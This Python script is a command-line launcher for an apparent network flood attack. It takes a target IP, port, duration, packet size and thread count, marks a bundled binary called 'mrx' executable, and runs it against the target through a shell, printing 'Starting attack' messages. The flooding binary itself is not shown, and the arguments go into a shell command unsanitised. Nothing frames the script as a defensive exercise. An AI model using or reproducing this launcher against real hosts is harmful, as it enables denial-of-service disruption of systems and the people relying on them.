import subprocess
import sys
import os

def main():
    if len(sys.argv) != 6:
        print("Usage: python3 main.py <ip> <port> <time> <packet_size> <threads>")
        sys.exit(1)
    
    ip, port, duration, size, threads = sys.argv[1:6]
    
    if os.path.exists("mrx"):
        os.chmod("mrx", 0o755)
    
    print(f"Starting attack on {ip}:{port}")
    
    result = subprocess.run(f"./mrx {ip} {port} {duration} {size} {threads}", shell=True)
    
    print(f"Attack finished")

if __name__ == "__main__":
    main()